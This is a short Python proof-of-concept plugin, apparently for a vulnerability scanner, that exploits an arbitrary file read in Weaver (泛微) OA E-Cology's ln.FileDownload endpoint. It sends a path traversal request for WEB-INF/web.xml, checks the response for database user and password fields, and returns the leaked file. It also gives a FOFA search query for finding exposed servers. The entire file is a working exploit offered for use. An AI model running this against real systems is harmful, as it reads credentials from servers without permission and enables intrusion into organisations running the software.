#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/upuTEkwSPbESXkpTHo9kzQ',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   '泛微OA E-Cology ln.FileDownload 任意文件读取',

      'level'     :   'medium',

      'FOFA'      :   'app="泛微-OA（e-cology）"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,

      'create_time':  '2024/7/2',
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'DriverClasses.*?ecology.user.*?ecologypassword.*?DEBUG_MODE',res.text,re.S):
      ret['huixian'] = res.text
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret